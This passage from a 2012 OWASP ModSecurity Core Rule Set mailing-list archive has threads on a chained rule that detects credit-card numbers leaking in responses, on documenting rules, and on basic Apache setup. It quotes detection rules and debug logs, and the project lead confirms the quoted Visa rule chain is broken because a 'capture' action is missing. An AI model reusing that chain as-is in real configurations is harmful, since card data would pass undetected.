                SecRule TX:CCDATA "^(\d{4}\-?)" "capture,setvar:tx.ccdata_begin=%{tx.1},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-LEAKAGE/CC-%{matched_var_name

**************
* LEVEL 9 DEBUG *
**************

[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Recipe: Invoking rule 2b6ce0495118; [file "/etc/httpd/conf/modsec
urity.d/activated_rules/modsecurity_crs_25_cc_known.conf"] [line "74"] [id "920008"].
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][5] Rule 2b6ce0495118: SecRule "RESPONSE_BODY|RESPONSE_HEADERS:Locati
on" "@verifyCC (?:^|[^\\d])(?<!google_ad_client = \"pub-)(4\\d{3}\\-?\\d{4}\\-?\\d{2}\\-?\\d{2}\\-?\\d(?:\\d{3})??)(?:[^\\d]|$)" "phase:4,log,chain,logdata:'Start of CC #: %{tx.ccdata_begin}**
*...',t:none,ctl:auditLogParts=-E,block,msg:'Visa Credit Card Number sent from site to user',id:920008,tag:WASCTC/5.2,tag:PCI/3.3,severity:1"
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Transformation completed in 0 usec.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Executing operator "verifyCC" with param "(?:^|[^\\d])(?<!google_
ad_client = \"pub-)(4\\d{3}\\-?\\d{4}\\-?\\d{2}\\-?\\d{2}\\-?\\d(?:\\d{3})??)(?:[^\\d]|$)" against RESPONSE_BODY.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9] Target value: "<!DOCTYPE html>\n<html>\n  <head>\n    <title>Page
 To Test WAF Output Blocking</title>\n  </head>\n\n  <body>\n    <p>Here is a credit card number.  Should block: 4111111111111111</p>\n  </body>\n</html>\n"
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Operator completed in 33 usec.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Ctl: Set auditLogParts to ABIJDFHZ.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Rule returned 1.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9] Match -> mode NEXT_RULE.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Recipe: Invoking rule 2b6ce049cff8; [file "/etc/httpd/conf/modsec
urity.d/activated_rules/modsecurity_crs_25_cc_known.conf"] [line "75"].
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][5] Rule 2b6ce049cff8: SecRule "TX:0" "@rx (\\d{4}\\-?\\d{4}\\-?\\d{2
}\\-?\\d{2}\\-?\\d{1,4})" "chain,capture,setvar:tx.ccdata=%{tx.1}"
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4] Rule returned 0.
[21/Jun/2012:13:55:25 --0700] [test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9] No match, chained -> mode NEXT_CHAIN.

From RBarnett at trustwave.com  Fri Jun 22 00:13:46 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Thu, 21 Jun 2012 19:13:46 -0500
Subject: [Owasp-modsecurity-core-rule-set] Question on
 optional_rules/modsecurity_crs_25_cc_known.conf
In-Reply-To: <4A12944D9F6AB24BB3423EEB6AED8860CEE1274A@FUL-INF-MAIL-01.infosendmail.local>
Message-ID: <CC093079.53050%ryan.barnett@owasp.org>


On 6/21/12 5:25 PM, "Jeremy Brown" <jeremy.b at infosend.com> wrote:

>Hello All,
>
>I am admitedly a novice at mod_security, and am currently trying to get
>myself up to speed by tuning it in a test environment to my needs.
>
>I have been testing the rules in
>optional_rules/modsecurity_crs_25_cc_known.conf (2.2.5), and am having
>problems getting the RESPONSE_BODY rules near the bottom to work
>properly.  FYI: The REQUEST rules near the top work fine.
>
>Using a fake Visa number that matches MOD10 validation, what I have found
>through debug is that rule 920008 is matching properly.  However, it
>moves on to the next rule in the chain, line 75 (SecRule TX:1....), which
>is returning "Rule returned 0."   This seems to terminate the chain and
>nullify the effect of the parent rule, 920008.
>
>What I found through Ivan's book is that TX:# variables will apparently
>not be set if the "capture" action is not set.  When I add "capture" to
>920008, everything works as expected.
>
>Am I misunderstanding this problem?  Should capture not be a required
>action in the parent of the chain?  Thank you for your assistance.


Hey Jeremy,
Looks like a legit error of omission.  This was tested in a previous
version and worked so I guess the capture action got dropped along the way
somewhere... Good catch.  We will add it back into these rules.

By the way, this further re-enforces the need for a full regression
testing update.  I will include this as part of our planning CRS update.

Thanks

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader



>
>****************
>* ORIGINAL RULES *
>****************
>
># Visa
>SecRule RESPONSE_BODY|RESPONSE_HEADERS:Location "@verifyCC
>(?:^|[^\d])(?<!google_ad_client =
>\"pub-)(4\d{3}\-?\d{4}\-?\d{2}\-?\d{2}\-?\d(?:\d{3})??)(?:[^\d]|$)" \
>  "chain,logdata:'Start of CC #:
>%{tx.ccdata_begin}***...',phase:4,t:none,ctl:auditLogParts=-E,block,msg:'V
>isa Credit Card Number sent from site to
>user',id:'920008',tag:'WASCTC/5.2',t
>        SecRule TX:1 "(\d{4}\-?\d{4}\-?\d{2}\-?\d{2}\-?\d{1,4})"
>"chain,capture,setvar:tx.ccdata=%{tx.1}"
>                SecRule TX:CCDATA "^(\d{4}\-?)"
>"capture,setvar:tx.ccdata_begin=%{tx.1},setvar:tx.anomaly_score=+%{tx.crit
>ical_anomaly_score},setvar:tx.%{rule.id}-LEAKAGE/CC-%{matched_var_name
>
>**************
>* LEVEL 9 DEBUG *
>**************
>
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Recipe: Invoking rule 2b6ce0495118; [file "/etc/httpd/conf/modsec
>urity.d/activated_rules/modsecurity_crs_25_cc_known.conf"] [line "74"]
>[id "920008"].
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][5]
>Rule 2b6ce0495118: SecRule "RESPONSE_BODY|RESPONSE_HEADERS:Locati
>on" "@verifyCC (?:^|[^\\d])(?<!google_ad_client =
>\"pub-)(4\\d{3}\\-?\\d{4}\\-?\\d{2}\\-?\\d{2}\\-?\\d(?:\\d{3})??)(?:[^\\d]
>|$)" "phase:4,log,chain,logdata:'Start of CC #: %{tx.ccdata_begin}**
>*...',t:none,ctl:auditLogParts=-E,block,msg:'Visa Credit Card Number sent
>from site to user',id:920008,tag:WASCTC/5.2,tag:PCI/3.3,severity:1"
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Transformation completed in 0 usec.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Executing operator "verifyCC" with param "(?:^|[^\\d])(?<!google_
>ad_client =
>\"pub-)(4\\d{3}\\-?\\d{4}\\-?\\d{2}\\-?\\d{2}\\-?\\d(?:\\d{3})??)(?:[^\\d]
>|$)" against RESPONSE_BODY.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9]
>Target value: "<!DOCTYPE html>\n<html>\n  <head>\n    <title>Page
> To Test WAF Output Blocking</title>\n  </head>\n\n  <body>\n    <p>Here
>is a credit card number.  Should block: 4111111111111111</p>\n
></body>\n</html>\n"
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Operator completed in 33 usec.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Ctl: Set auditLogParts to ABIJDFHZ.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Rule returned 1.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9]
>Match -> mode NEXT_RULE.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Recipe: Invoking rule 2b6ce049cff8; [file "/etc/httpd/conf/modsec
>urity.d/activated_rules/modsecurity_crs_25_cc_known.conf"] [line "75"].
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][5]
>Rule 2b6ce049cff8: SecRule "TX:0" "@rx (\\d{4}\\-?\\d{4}\\-?\\d{2
>}\\-?\\d{2}\\-?\\d{1,4})" "chain,capture,setvar:tx.ccdata=%{tx.1}"
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][4]
>Rule returned 0.
>[21/Jun/2012:13:55:25 --0700]
>[test.xyz.com/sid#2b6ce015c0a8][rid#2b6ce12fd590][/~test/waftest.html][9]
>No match, chained -> mode NEXT_CHAIN.
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From jamuse at gmail.com  Thu Jun 28 20:05:25 2012
From: jamuse at gmail.com (Josh Amishav-Zlatin)
Date: Thu, 28 Jun 2012 23:05:25 +0300
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Documenting rules with Markdown
Message-ID: <CANnPki=6mhAtAp-nA3ERdoYMUF0BAWuOLUMJEsRHzgKHu2tiqA@mail.gmail.com>

A while back Ryan setup per rule documentation on OWASP's wiki. As of now,
I think there are only three rules that are actually fully documented
there, yet many rules contain a link to the wiki for more information. As
part of the reorganization for CRS v3.0, I thought it might be a good idea
to consolidate the documentation and the need to maintain it in multiple
locations. One possibility is to use markdown syntax within the CRS
comments and then generate the per rule documentation from there. I created
a small example to demonstrate here: http://pastebin.com/8QX83mQU

Your thoughts?

--
 - Joh
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120628/b63d1e59/attachment.html>

From support at enigma.ie  Fri Jun 29 11:42:15 2012
From: support at enigma.ie (Enigma Support)
Date: Fri, 29 Jun 2012 12:42:15 +0100
Subject: [Owasp-modsecurity-core-rule-set] CRS 2.2.5 setup help needed
Message-ID: <CADsXbD4O8t+w-HBqEKjGJ3DJ5otz25h8rm4=qfZTSJ==Bdn_cg@mail.gmail.com>

I have setup modsecurity 2.6.5 and downloaded the crs when I untar it I
have a folder in my temp folder called crs inside this I have various files
namely branches, tags and trunks.   What do i need to do to get the basics
up and running ?

Note please provide lots of details as I have never used this before.  I
have seen different report on adding sections to <if module mod_security2.c
and Include but dint know what ones are right for the crs 2.2.5

 I am using Apache 2 and it is installed in /usr/local/apache2

Also what is a good test to check functionality

Thanks
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120629/daebfe92/attachment.html>

From matt at betweenbrain.com  Fri Jun 29 16:32:32 2012
From: matt at betweenbrain.com (Matt Thomas)
Date: Fri, 29 Jun 2012 12:32:32 -0400
Subject: [Owasp-modsecurity-core-rule-set] CRS 2.2.5 setup help needed
In-Reply-To: <CADsXbD4O8t+w-HBqEKjGJ3DJ5otz25h8rm4=qfZTSJ==Bdn_cg@mail.gmail.com>
References: <CADsXbD4O8t+w-HBqEKjGJ3DJ5otz25h8rm4=qfZTSJ==Bdn_cg@mail.gmail.com>
Message-ID: <CAOXGsbK7JEkhEmKtMf0e8jUsWLdSiQQ2EXy4XehH+wzhv1_s6A@mail.gmail.com>

Hello,

It sounds like you have downloaded the entire SVN repository. You might
want to look at
https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project,
specifically the download and installation tabs, for more details than I
can provide.

The latest CRS version can be manually downloaded from
http://sourceforge.net/projects/mod-security/files/modsecurity-crs/0-CURRENT/


The quick setup is to copy the rules, and rule directories, that you want
to use to a directory like /etc/apache2/modsecurity-crs/slr_rules/ and then
add the following to httpd.conf, or as a new file like
/etc/apache2/conf.d/modsecurity

<IfModule security2_module>
    Include modsecurity-crs/modsecurity_crs_10_config.conf
    Include modsecurity-crs/base_rules/*.conf
    Include modsecurity-crs/activated_rules/*.conf
</IfModule>


There are a few ways retrieve the files, so you might want to check out
that first page and see which would work best for you.

Hope that helps.

Best,

Matt Thomas
Founder betweenbrain <http://betweenbrain.com/>?
Lead Developer Construct Template Development
Framework<http://construct-framework.com/>
Phone: 203.632.9322
Twitter: @betweenbrain
Github: https://github.com/betweenbrain



On Fri, Jun 29, 2012 at 7:42 AM, Enigma Support <support at enigma.ie> wrote:

> I have setup modsecurity 2.6.5 and downloaded the crs when I untar it I
> have a folder in my temp folder called crs inside this I have various files
> namely branches, tags and trunks.   What do i need to do to get the basics
> up and running ?
>
> Note please provide lots of details as I have never used this before.  I
> have seen different report on adding sections to <if module mod_security2.c
> and Include but dint know what ones are right for the crs 2.2.5
>
>  I am using Apache 2 and it is installed in /usr/local/apache2
>
> Also what is a good test to check functionality
>
> Thanks
>
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120629/05c9e8d6/attachment.html>

From support at enigma.ie  Fri Jun 29 19:04:56 2012
From: support at enigma.ie (Enigma Support)
Date: Fri, 29 Jun 2012 20:04:56 +0100
Subject: [Owasp-modsecurity-core-rule-set] CRS 2.2.5 setup help needed
In-Reply-To: <CAOXGsbK7JEkhEmKtMf0e8jUsWLdSiQQ2EXy4XehH+wzhv1_s6A@mail.gmail.com>
References: <CADsXbD4O8t+w-HBqEKjGJ3DJ5otz25h8rm4=qfZTSJ==Bdn_cg@mail.gmail.com>
	<CAOXGsbK7JEkhEmKtMf0e8jUsWLdSiQQ2EXy4XehH+wzhv1_s6A@mail.gmail.com>
Message-ID: <CADsXbD5OVVhu5gkWz_P5LycmEvZ_MJyrbvt6PdnzMzzFt-uu5A@mail.gmail.com>

 How do I configure settings,  from one site use a config file like the one
below, and point httpd.conf at it but this give as a page fault when i
start Apache ????

The OWASp web site is very poor they dont explain how to configure
mod_security infact its was here i got the link that downloaded everything
http://mod-security.svn.sourceforge.net/viewvc/mod-security/m2/trunk/modsecurity.conf-recommended


On 29 June 2012 17:32, Matt Thomas <matt at betweenbrain.com> wrote:

> Hello,
>
> It sounds like you have downloaded the entire SVN repository. You might
> want to look at
> https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project,
> specifically the download and installation tabs, for more details than I
> can provide.
>
> The latest CRS version can be manually downloaded from
> http://sourceforge.net/projects/mod-security/files/modsecurity-crs/0-CURRENT/
>
>
> The quick setup is to copy the rules, and rule directories, that you want
> to use to a directory like /etc/apache2/modsecurity-crs/slr_rules/ and
> then add the following to httpd.conf, or as a new file like
> /etc/apache2/conf.d/modsecurity
>
> <IfModule security2_module>
>     Include modsecurity-crs/modsecurity_crs_10_config.conf
>     Include modsecurity-crs/base_rules/*.conf
>     Include modsecurity-crs/activated_rules/*.conf
> </IfModule>
>
>
> There are a few ways retrieve the files, so you might want to check out
> that first page and see which would work best for you.
>
> Hope that helps.
>
> Best,
>
> Matt Thomas
> Founder betweenbrain <http://betweenbrain.com/>?
> Lead Developer Construct Template Development Framework<http://construct-framework.com/>
> Phone: 203.632.9322
> Twitter: @betweenbrain
> Github: https://github.com/betweenbrain
>
>
>
> On Fri, Jun 29, 2012 at 7:42 AM, Enigma Support <support at enigma.ie> wrote:
>
>> I have setup modsecurity 2.6.5 and downloaded the crs when I untar it I
>> have a folder in my temp folder called crs inside this I have various files
>> namely branches, tags and trunks.   What do i need to do to get the basics
>> up and running ?
>>
>> Note please provide lots of details as I have never used this before.  I
>> have seen different report on adding sections to <if module mod_security2.c
>> and Include but dint know what ones are right for the crs 2.2.5
>>
>>  I am using Apache 2 and it is installed in /usr/local/apache2
>>
>> Also what is a good test to check functionality
>>
>> Thanks
>>
>>
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>>
>>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120629/7cceab0a/attachment.html>

